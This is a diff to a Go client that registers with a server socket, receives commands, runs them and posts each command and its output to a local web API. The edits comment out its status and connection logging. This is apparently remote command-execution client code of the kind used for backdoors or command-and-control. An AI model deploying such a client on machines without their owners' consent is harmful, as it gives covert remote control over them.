@@ -72,7 +72,8 @@ func registerOnServerSocket() (Client, error) {
         log.Println("Error connecting:", err.Error())
         return Client{}, err
     }
-    log.Println("Connected with server")
+
+    //log.Println("Connected with server")
 
     // Send client struct to register in server socket
     encoder := gob.NewEncoder(conn)
@@ -91,7 +92,7 @@ func verifyRegister(client Client)  (net.Listener, error) {
         return nil, err
     }
 
-    fmt.Println("Listening on client socket")
+    //fmt.Println("Listening on client socket")
 
     connection, err := clientSocket.Accept()
     if err != nil {
@@ -107,7 +108,8 @@ func verifyRegister(client Client)  (net.Listener, error) {
         return nil, fmt.Errorf("Something went wrong and the client was not registered by server")
     }
     
-    fmt.Println(string(serverMsg[:serverMsgLen]))
+    //fmt.Println(string(serverMsg[:serverMsgLen])) // DEBUG mensage with REGISTERED string
+    fmt.Println("OK!")
 
     return clientSocket, nil
 }
@@ -125,8 +127,8 @@ type Data struct {
 // Function to send request to server API
 func respondToServer(command, result string) error {
     data := &Data{
-        Command:  command,      // TODO: get server command
-        Result:   result,       // TODO: get result
+        Command:  command,
+        Result:   result,
         Time:     "my time",    // TODO: get the real timestamp
     }
 
@@ -138,7 +140,6 @@ func respondToServer(command, result string) error {
 
     resp, err := http.Post("http://localhost:8080/", "application/json", tempBuffer) // TODO: fix this hardcoded stuff
     if err != nil {
-        fmt.Println(err)
         return err
     }
     defer resp.Body.Close()
@@ -173,8 +174,6 @@ func getCommands(client Client, clientSocket net.Listener) error {
             log.Fatal(err)
         }
 
-        // TODO:send response to server web app
-        //fmt.Println(string(out))
         respondToServer(command, string(out))
     }
 }
